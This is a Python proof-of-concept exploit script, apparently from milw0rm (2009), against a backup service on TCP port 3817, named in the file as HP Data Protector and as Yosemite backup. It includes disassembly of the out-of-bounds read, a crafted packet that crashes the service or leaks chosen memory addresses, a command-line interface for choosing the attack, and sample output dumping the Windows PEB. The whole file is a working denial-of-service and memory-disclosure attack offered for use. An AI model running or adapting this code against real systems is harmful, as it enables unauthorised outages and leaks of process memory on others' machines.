@@ -1,0 +1,153 @@
+#!/usr/bin/env python
+
+#POC Memory disclosure/ Denial Of Service
+#HP Data protector 4.00-sp1 43064
+#Tested for Windows Version Only
+
+
+'''
+Buggy code @dpwinsup module of dpwingad process running at 3817/TCP port dpwinsup.10275F80
+
+100DDE89   8B15 54A72210    MOV EDX,DWORD PTR DS:[1022A754]  
+100DDE8F   8B82 98650000    MOV EAX,DWORD PTR DS:[EDX+6598]
+100DDE95   8B4C24 54        MOV ECX,DWORD PTR SS:[ESP+54] 	;ECX = user controlled data
+100DDE99   8D1481           LEA EDX,DWORD PTR DS:[ECX+EAX*4] 	;EDX = if invalid/valid offset         
+100DDE9C   8B3495 F0A42210  MOV ESI,DWORD PTR DS:[EDX*4+1022A4F0] ;Crash/Memory Leak      
+100DDEA3   83C4 1C          ADD ESP,1C
+100DDEA6   897424 10        MOV DWORD PTR SS:[ESP+10],ESI
+
+'''
+
+import socket
+import sys
+import struct
+import time
+import getopt
+
+bf = ("\x54\x84\x00\x00" +
+         "\x00\x00\x00\x00" +
+         "\x06\x00\x00\x00" +
+         "\x92\x00\x00\x00" +
+         "data")
+
+
+ip = '192.168.0.14'
+port = 3817
+addr = (ip,port)
+mem_addr = 0x7ffdf000 #PEB for windows
+DEBUG = False
+
+
+def exploit_memory(ip_addr,read_mem):
+    s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_addr,port))
+
+    reqst = bf.replace("data","A"*130)
+    #t = ((addr-1022AC80)/4 - 4)
+    t = ((read_mem-0x1022A4F0)/4 - 4)
+    print "0x%x" % t
+
+    reqst = reqst[0:32] + struct.pack("<L",t) +  reqst[36:]
+    s.send(reqst)
+    resp = s.recv(1000)
+    leak = struct.unpack("<L",resp[32:36])
+    #print type(leak[0])
+    if DEBUG:
+            print "Len of resp: %d" % len(resp)
+            for i in range(0,len(resp)):
+                if i % 16 ==0:
+                    print
+                print "0x%02x" % struct.unpack("<B",resp[i]),
+            print
+
+    s.close()
+    return leak[0]
+
+def dos_yosemite(ip_addr):
+    print "[*] Sending DOS Exploit."
+    s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_addr,port))
+    reqst = bf.replace("data","A"*130)
+    s.send(reqst)
+    #resp = s.recv(1000)
+    s.close()
+
+def main():
+        try:
+            opt, args = getopt.getopt(sys.argv[1:],"ht:e:",["help","target=","exploit="])
+	    if len(opt)==0:
+		usage()
+		sys.exit(0)
+	except getopt.GetoptError,err:
+	    print str(err)
+	    usage()
+	    sys.exit(2)
+
+	for o,a in opt:
+		if o in ("-h","--help"):
+		      usage()
+		      sys.exit()
+		elif o in ("-e","--exploit"):
+			for opt_target,arg_target in opt:
+				if opt_target in ("-t","--target"):
+					if int(a) == 0: # DoS
+                                            dos_yosemite(arg_target)
+                                            sys.exit(0)
+                                        elif int(a) == 1:
+                                            print "[*] Dumping Memory..{PEB}"    
+                                            for i in range(0,int(0x50),4): #Poc to read the 80bytes from memory 
+                                                leak = exploit_memory(arg_target,mem_addr+i)
+                                                time.sleep(0.5)
+                                                print "0x%08x ---> 0x%08x" % ((mem_addr+i),leak)
+                                            sys.exit()
+                                        else:
+                                            print "[*] Unknown Exploit type"
+                                            usage()
+                                            sys.exit()
+                                else:
+                                    print "[*] Target Missing"
+                                    usage()
+                                    sys.exit()
+                                
+                else:
+                    continue
+def usage():
+    print "Yosemite DoS and Information Disclosure Exploit"
+    #print "Yosemite backup standard v8.7 build 43905 Trial"
+    #print "Tested for Windows Versions"
+    print "Available Options"
+    print "\t -t | --target     target address"
+    print "\t -e | --exploit    { 0 - Dos \ 1 - Memory Leak }"
+    print "\n"
+if __name__=='__main__':
+    main()
+    
+'''
+C:\pocs>python poc_yosemite.py -t 192.168.0.14 -e 1
+[*] Dumping Memory..{PEB}
+0x7ffdf000 ---> 0x0012fbc4
+0x7ffdf004 ---> 0x00130000
+0x7ffdf008 ---> 0x0012d000
+0x7ffdf00c ---> 0x00000000
+0x7ffdf010 ---> 0x00001e00
+0x7ffdf014 ---> 0x00000000
+0x7ffdf018 ---> 0x7ffdf000
+0x7ffdf01c ---> 0x00000000
+0x7ffdf020 ---> 0x00000c54
+0x7ffdf024 ---> 0x00000cfc
+0x7ffdf028 ---> 0x00000000
+0x7ffdf02c ---> 0x00000000
+0x7ffdf030 ---> 0x7ffdb000
+0x7ffdf034 ---> 0x00000000
+0x7ffdf038 ---> 0x00000000
+0x7ffdf03c ---> 0x00000000
+0x7ffdf040 ---> 0xe15b42a0
+0x7ffdf044 ---> 0x00000000
+0x7ffdf048 ---> 0x00000000
+0x7ffdf04c ---> 0x00000000
+
+C:\pocs>python poc_yosemite.py -t 192.168.0.14 -e 0
+[*] Sending DOS Exploit.
+'''
+
+# milw0rm.com [2009-06-23]
